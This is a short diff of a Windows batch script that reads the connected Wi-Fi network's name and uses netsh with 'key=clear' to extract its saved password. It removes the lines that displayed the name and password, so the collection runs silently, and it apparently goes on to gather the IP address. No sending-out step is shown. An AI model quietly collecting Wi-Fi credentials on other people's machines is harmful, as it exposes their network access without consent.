@@ -8,11 +8,10 @@ for /f "tokens=2 delims=:" %%a in ('netsh wlan show interfaces ^| findstr /c:"SS
 :get_password
 
 set "wifi_name=!ssid:~1!"
-echo You are connected to: !wifi_name!
+
 
 for /f "tokens=2 delims=:" %%b in ('netsh wlan show profile name^="!wifi_name!" key^=clear ^| findstr /c:"Key Content"') do (
     set "password=%%b"
-    echo Password for !wifi_name!: !password!
 )
 
 rem Get IPv4 Address
